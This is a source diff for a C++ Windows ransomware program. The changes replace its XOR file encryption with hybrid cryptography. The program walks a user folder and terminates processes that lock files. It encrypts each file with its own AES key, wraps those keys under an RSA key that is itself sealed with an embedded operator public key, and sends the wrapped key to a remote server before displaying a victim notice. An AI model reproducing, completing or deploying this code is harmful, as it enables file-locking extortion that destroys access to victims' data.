@@ -3,40 +3,54 @@
 using namespace std;
 auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");
 
-void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript);
-void encryptFile(const std::filesystem::path& path, const std::string& key);
-void decryptFile(const path_t& filePath, const std::string& key);
+void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCrypt);
+void keysSetup(string* encryptedPrivateKey, std::vector<std::string>* encryptedAESKeys, std::vector<std::vector<CryptoPP::byte>>* AESkeys, std::vector<path_t>& pathToCrypt);
+CryptoPP::RSA::PublicKey ourKey();
+std::pair<CryptoPP::RSA::PrivateKey, CryptoPP::RSA::PublicKey> GenerateRSAKey(int keyLength);
+void GenerateAESKey(CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH]);
+std::string RSAEncrypt(const CryptoPP::RSA::PublicKey& publicKey, const std::string& plain);
+std::string RSADecrypt(const CryptoPP::RSA::PrivateKey& privateKey, const std::string& cipher);
+void AESEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename);
+void AESDecrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename);
+std::string hybrEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& plain);
 void checkIfInUse(std::filesystem::path filePath);
 void terminateProcessById(DWORD processId);
-void keyTransfer(string key, std::vector<path_t>& pathToDecrypt);
+void keyTransfer(string encrRSAkeyStr, std::vector<std::string> encrAESkeys, std::vector<path_t>& pathToDecrypt);
 
 int main(int argc, char* argv[])
 {
     setlocale(LC_ALL, "Russian");
     path_t directory = "C:/Users/-/Desktop/PureWare";
-    std::vector<path_t> pathToCript;
+    std::vector<path_t> pathToCrypt;
 
     file_logger->set_level(spdlog::level::info);
     file_logger->info("start the Cript");
 
-    traverseDirectory(directory, pathToCript);
+    traverseDirectory(directory, pathToCrypt);
 
-    string key{ 12 };
-    for (const auto& NextFile : pathToCript) {
+    std::string encryptedPrivateKey;
+    std::vector<std::string> encryptedAESKeys;
+    std::vector<std::vector<CryptoPP::byte>> AESkeys;
+    keysSetup(&encryptedPrivateKey, &encryptedAESKeys, &AESkeys, pathToCrypt);
+
+    auto keyIter = AESkeys.begin();
+    for (const auto& NextFile : pathToCrypt) {
         file_logger->info("path {}", NextFile.string());
         if (std::filesystem::is_regular_file(NextFile)) {
-            encryptFile(NextFile, key);
+            checkIfInUse(NextFile);
+            AESEncrypt(keyIter->data(), NextFile.string());
         }
+        std::memset(keyIter->data(), 0, keyIter->size());
+        ++keyIter;
     }
 
-
-    keyTransfer(key, pathToCript);
     NoteModule warn_user;
     warn_user.NotifyUsersAboutWorkResults();
+    keyTransfer(encryptedPrivateKey, encryptedAESKeys, pathToCrypt);
     return 0;
 }
 
-void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
+void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCrypt) {
     try {
         if (filesystem::exists(path) && filesystem::is_directory(path)) {
             bool isEmpty = true;
@@ -49,19 +63,19 @@ void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
 
                 if (entry.is_directory()) {
                     // Recursive call to traverse subdirectories
-                    traverseDirectory(filePath, pathToCript);
+                    traverseDirectory(filePath, pathToCrypt);
                     isEmpty = false;
                 }
                 else if (entry.is_regular_file()) {
                     // Add file to the vector
-                    pathToCript.emplace_back(filePath);
+                    pathToCrypt.emplace_back(filePath);
                     isEmpty = false;
                 }
             }
 
             if (!isEmpty) {
                 // Add non-empty directory to the vector
-                pathToCript.emplace_back(path);
+                pathToCrypt.emplace_back(path);
             }
         }
     }
@@ -76,68 +90,215 @@ void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
     }
 }
 
-void encryptFile(const std::filesystem::path& path, const std::string& key) {
+void keysSetup(string* encryptedPrivateKey, std::vector<std::string>* encryptedAESKeys, std::vector<std::vector<CryptoPP::byte>>* AESkeys, std::vector<path_t>& pathToCrypt)
+{
+    // Generate RSA keys pair
+    int keyLength = 2048;
+    auto keyPair = GenerateRSAKey(keyLength);
 
-    checkIfInUse(path);
+    // Convert private key to string
+    CryptoPP::ByteQueue queue;
+    keyPair.first.Save(queue);
+    std::string privateKeyStr;
+    CryptoPP::StringSink ss(privateKeyStr);
+    queue.CopyTo(ss);
+    ss.MessageEnd();
+    queue.Clear();
 
-    // Проверка существования файла и доступности для чтения
-    if (!std::filesystem::exists(path) || !std::filesystem::is_regular_file(path)) {
-        file_logger->critical("Файл не найден или это не файл: {}", path.string());
-        return;
+    // Ecrypt generated RSA private key with our public key through hybrid encryption
+    CryptoPP::RSA::PublicKey key0 = ourKey();
+    CryptoPP::byte hybrKey[CryptoPP::AES::DEFAULT_KEYLENGTH];
+    GenerateAESKey(hybrKey);
+    std::string hybrKeyStr(reinterpret_cast<char*>(hybrKey), CryptoPP::AES::DEFAULT_KEYLENGTH);
+    std::string encryptedHybrKey = RSAEncrypt(key0, hybrKeyStr);
+    *encryptedPrivateKey = hybrEncrypt(hybrKey, privateKeyStr) + "AMOGUS" + encryptedHybrKey;
+    std::memset(hybrKey, 0, sizeof(hybrKey));
+
+    // Serialize RSA private key into a byte array and clear it
+    keyPair.first.DEREncode(queue);
+    size_t length = queue.CurrentSize();
+    CryptoPP::byte* buffer = new CryptoPP::byte[length];
+    queue.Get(buffer, length);
+    queue.Clear();
+    std::memset(buffer, 0, length);
+    delete[] buffer;
+
+    // Encrypt AES keys with generated RSA public key
+    for (const auto& NextFile : pathToCrypt) {
+        CryptoPP::byte AESkey[CryptoPP::AES::DEFAULT_KEYLENGTH];
+        GenerateAESKey(AESkey);
+        std::string aesKeyStr(reinterpret_cast<char*>(AESkey), CryptoPP::AES::DEFAULT_KEYLENGTH);
+        std::string encryptedAESKey = RSAEncrypt(keyPair.second, aesKeyStr);
+        encryptedAESKeys->push_back(encryptedAESKey);
+        std::vector<CryptoPP::byte> AESkeyVec(AESkey, AESkey + CryptoPP::AES::DEFAULT_KEYLENGTH);
+        AESkeys->push_back(AESkeyVec);
     }
-
-    // Открытие файла для чтения в бинарном режиме
-    std::ifstream file(path, std::ios::binary);
-    if (!file.is_open()) {
-        file_logger->critical("Не удалось открыть файл для чтения: {}", path.string());
-        return;
-    }
-
-    // Чтение содержимого файла
-    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-    file.close();
-
-    // XOR шифрование
-    for (size_t i = 0; i < buffer.size(); ++i) {
-        buffer[i] ^= key[i % key.length()];
-    }
-
-    // Запись зашифрованных данных обратно в файл
-    std::ofstream outfile(path, std::ios::binary);
-    if (!outfile.is_open()) {
-        file_logger->critical("Не удалось открыть файл для записи : {}", path.string());
-        return;
-    }
-
-    outfile.write(buffer.data(), buffer.size());
-    outfile.close();
 }
 
-void decryptFile(const path_t& filePath, const std::string& key) {
-    // Open the file for reading in binary mode
-    std::ifstream fileIn(filePath, std::ios::binary);
-    if (!fileIn) {
-        file_logger->critical("Cannot open file: {}", filePath.string());
-        return;
-    }
-    // Read the file content
-    std::string fileContent((std::istreambuf_iterator<char>(fileIn)), std::istreambuf_iterator<char>());
-    fileIn.close();
+CryptoPP::RSA::PublicKey ourKey()
+{
+    // Predetermined RSA public key in Base64 format
+    std::string publicKeyBase64 =
+        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzU6CQOK5B5PjilZSYXf1"
+        "GqGKFcwudCQDBi2o9I6lO3yGJfkTgZ4q1feRQh8NiVOPq+JFg2y2I0yBq+0rDpyB"
+        "Tht+iO2Hzj8RSIcVaI7qP5vj1PD8vgG4GZx7MNdf3H2X9qJAdWG4vckZYT0t2ZWK"
+        "kTjS8BjZE5B5H5ZcwZTXMF6v0BcJa2FqFJSRZ+aHM2j/6F1huh+0D7UWux4zVBvC"
+        "YQ1UH6A+zd3VqRVQza8Jv5I4Hun2N06suHjTTPTZnV6TrQb2a2F7A5BjqNUCBsvq"
+        "z6ItDZvgIFMjZgoAH2+PiQUnRcYyNjzx0YxEzyq9n3xumGeTqobGA5HXFNjbxAlu"
+        "wQIDAQAB";
 
-    // Perform XOR decryption (same as encryption)
-    for (size_t i = 0; i < fileContent.size(); ++i) {
-        fileContent[i] ^= key[i % key.size()];
-    }
+    // Convert the Base64-encoded key to a ByteQueue
+    CryptoPP::ByteQueue bytes;
+    CryptoPP::StringSource ss(publicKeyBase64, true, new CryptoPP::Base64Decoder);
+    ss.TransferTo(bytes);
+    bytes.MessageEnd();
 
-    // Write the decrypted content back to the file
-    std::ofstream fileOut(filePath, std::ios::binary);
-    if (!fileOut) {
-        file_logger->critical("Cannot open file: {}", filePath.string());
-        return;
-    }
+    // Load the public key from the ByteQueue
+    CryptoPP::RSA::PublicKey publicKey;
+    publicKey.Load(bytes);
+    return publicKey;
+}
 
-    fileOut.write(fileContent.data(), fileContent.size());
-    fileOut.close();
+std::pair<CryptoPP::RSA::PrivateKey, CryptoPP::RSA::PublicKey> GenerateRSAKey(int keyLength)
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Generate random RSA function parameters with the specified key length
+    CryptoPP::InvertibleRSAFunction parameters;
+    parameters.GenerateRandomWithKeySize(rng, keyLength);
+
+    // Generate keys
+    CryptoPP::RSA::PrivateKey privateKey(parameters);
+    CryptoPP::RSA::PublicKey publicKey(parameters);
+
+    return { privateKey, publicKey };
+}
+
+void GenerateAESKey(CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH])
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Generate random key
+    rng.GenerateBlock(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
+}
+
+std::string RSAEncrypt(const CryptoPP::RSA::PublicKey& publicKey, const std::string& plain)
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Create an RSA encryptor with the public key
+    CryptoPP::RSAES_OAEP_SHA_Encryptor encryptor(publicKey);
+
+    // Encrypt the plaintext and store it in 'cipher'
+    std::string cipher;
+    CryptoPP::StringSource ss1(plain, true,
+        new CryptoPP::PK_EncryptorFilter(rng, encryptor,
+            new CryptoPP::StringSink(cipher)
+       ) 
+    ); 
+
+    return cipher;
+}
+
+std::string RSADecrypt(const CryptoPP::RSA::PrivateKey& privateKey, const std::string& cipher)
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Create an RSA decryptor with the private key
+    CryptoPP::RSAES_OAEP_SHA_Decryptor decryptor(privateKey);
+
+    // Decrypt the ciphertext and store it in 'recovered'
+    std::string recovered;
+    CryptoPP::StringSource ss2(cipher, true,
+        new CryptoPP::PK_DecryptorFilter(rng, decryptor,
+            new CryptoPP::StringSink(recovered)
+        )
+    );
+
+    return recovered; 
+}
+
+void AESEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename)
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Generate a random initialization vector
+    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
+    rng.GenerateBlock(iv, sizeof(iv));
+
+    // Create an AES encryptor with the key and initialization vector
+    CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor(key, CryptoPP::AES::DEFAULT_KEYLENGTH, iv);
+
+    // Read the entire file into a string
+    std::string plain;
+    CryptoPP::FileSource fs(filename.c_str(), true, new CryptoPP::StringSink(plain));
+
+    // Encrypt the plaintext and store it in 'cipher'
+    std::string cipher;
+    CryptoPP::StringSource ss(plain, true,
+        new CryptoPP::StreamTransformationFilter(encryptor,
+            new CryptoPP::StringSink(cipher)
+        )
+    );
+
+    // Write the cipher back to the file
+    CryptoPP::StringSource ss2(cipher, true, new CryptoPP::FileSink(filename.c_str()));
+}
+
+void AESDecrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename)
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Generate a random initialization vector
+    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
+    rng.GenerateBlock(iv, sizeof(iv));
+
+    // Create an AES decryptor with the key and initialization vector
+    CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption decryptor(key, CryptoPP::AES::DEFAULT_KEYLENGTH, iv);
+
+    // Read the entire file into a string
+    std::string cipher;
+    CryptoPP::FileSource fs(filename.c_str(), true, new CryptoPP::StringSink(cipher));
+
+    // Decrypt the ciphertext and store it in 'recovered'
+    std::string recovered;
+    CryptoPP::StringSource ss(cipher, true,
+        new CryptoPP::StreamTransformationFilter(decryptor,
+            new CryptoPP::StringSink(recovered)
+        )
+    );
+
+    // Write the recovered back to the file
+    CryptoPP::StringSource ss2(recovered, true, new CryptoPP::FileSink(filename.c_str()));
+}
+
+std::string hybrEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& plain)
+{
+    // Create a random number generator
+    CryptoPP::AutoSeededRandomPool rng;
+
+    // Generate a random initialization vector
+    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
+    rng.GenerateBlock(iv, sizeof(iv));
+
+    // Create an AES encryptor with the key and initialization vector
+    CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor(key, CryptoPP::AES::DEFAULT_KEYLENGTH, iv);
+
+    // Encrypt the plaintext and store it in 'cipher'
+    std::string cipher;
+    CryptoPP::StringSource ss(plain, true,
+        new CryptoPP::StreamTransformationFilter(encryptor,
+            new CryptoPP::StringSink(cipher)
+        )
+    );
+
+    return cipher;
 }
 
 void checkIfInUse(std::filesystem::path filePath)
@@ -167,9 +328,9 @@ void checkIfInUse(std::filesystem::path filePath)
     UINT ProcAm = 0;
     RM_PROCESS_INFO* pids = nullptr;
     dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason);
+
+    // Some process is using the file - allocate space and call RmGetList again
     if (dwError == ERROR_MORE_DATA) {
-        // Some process is using the file
-        // Allocate space and call RmGetList again
         nProcInfo = nProcInfoNeeded;
         delete[] pids;
         pids = new RM_PROCESS_INFO[nProcInfo]();
@@ -213,7 +374,7 @@ void terminateProcessById(DWORD processId)
     CloseHandle(processHandle);
 }
 
-void keyTransfer(string key, std::vector<path_t>& pathToDecrypt)
+void keyTransfer(string encrRSAkeyStr, std::vector<std::string> encrAESkeys, std::vector<path_t>& pathToDecrypt)
 {
     // Initialize Winsock
     WSADATA wsaData;
@@ -269,23 +430,35 @@ void keyTransfer(string key, std::vector<path_t>& pathToDecrypt)
     }
 
     // Send encryption key to the server
-    send(sock, key.c_str(), key.size(), 0);
+    send(sock, encrRSAkeyStr.c_str(), encrRSAkeyStr.size(), 0);
 
     // Receive decryption key from the server
-    string decrKey;
-    char buffer[1024] = { 0 };
+    string decrRSAkeyStr;
+    char buffer[2048] = { 0 };
     while (true) {
         int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (bytesRead <= 0) {
             break;
         }
         buffer[bytesRead] = '\0';
-        decrKey += buffer;
+        decrRSAkeyStr += buffer;
     }
 
-    // Decrypt files with obtained key
+    // Convert our string to actual key
+    CryptoPP::ByteQueue queue;
+    CryptoPP::StringSource ss(decrRSAkeyStr, true, new CryptoPP::Redirector(queue));
+    CryptoPP::RSA::PrivateKey decrRSAkey;
+    decrRSAkey.Load(queue);
+    queue.Clear();
+
+    // Decrypt AES keys and all files
+    CryptoPP::byte decrAESkey[CryptoPP::AES::DEFAULT_KEYLENGTH];
+    auto keyIter = encrAESkeys.begin();
     for (const auto& NextFile : pathToDecrypt) {
-        decryptFile(NextFile, decrKey);
+        std::string decrAESKeyStr = RSADecrypt(decrRSAkey, keyIter->data());
+        memcpy(decrAESkey, decrAESKeyStr.data(), CryptoPP::AES::DEFAULT_KEYLENGTH);
+        AESDecrypt(decrAESkey, NextFile.string());
+        ++keyIter;
     }
 
     // Perform cleanup
